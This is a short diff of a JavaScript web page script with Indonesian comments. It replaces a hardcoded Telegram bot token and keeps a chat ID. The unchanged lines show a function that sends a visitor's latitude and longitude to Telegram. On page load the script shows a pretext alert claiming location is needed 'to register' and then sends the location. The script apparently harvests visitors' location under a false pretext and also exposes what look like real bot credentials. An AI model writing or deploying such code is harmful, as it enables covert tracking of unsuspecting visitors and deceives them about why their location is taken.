@@ -1,5 +1,5 @@
 // Gantilah 'YOUR_BOT_TOKEN' dan 'YOUR_CHAT_ID' dengan informasi bot Telegram Anda.
-var botToken = '6441266112:AAHLvHHiJcKXrKDsifdyJVVt-RPzYu8asIY';
+var botToken = '6971531948:AAGrpAFnzgAiqKaazzVC_lIVhtabOX1so6k';
 var chatId = '903460372';
 
 function sendLocationToTelegram(latitude, longitude) {
@@ -40,3 +40,4 @@ document.addEventListener("DOMContentLoaded", function () {
     alert('This website requires your location to register. Please allow location access.');
     getLocationAndSend();
 });
+
